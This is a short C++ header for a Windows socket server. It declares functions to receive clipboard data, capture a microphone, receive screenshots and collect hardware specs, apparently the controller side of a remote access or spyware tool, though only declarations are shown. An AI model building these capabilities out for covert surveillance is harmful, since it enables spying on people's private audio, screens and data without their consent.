#pragma once
#include "packet.h"
#include <iostream>
#include <WinSock2.h>
#pragma comment(lib,"Ws2_32.lib")

class wsaWrapper
{
	WSADATA wsa;
	int res = 0;
	
public:
	wsaWrapper();
	~wsaWrapper();
};

namespace network {

	static SOCKET srvSOCKET = INVALID_SOCKET;
	static SOCKET cliSOCKET = INVALID_SOCKET;
	static sockaddr_in clAddr , srvAddr;
	static int result = 0;
	
	int _start_Server( short PORT);
	int _rcvClipbord();
	int _captureMic();
	int _rcvScrShot();
	int _rcvHWSpecs();
}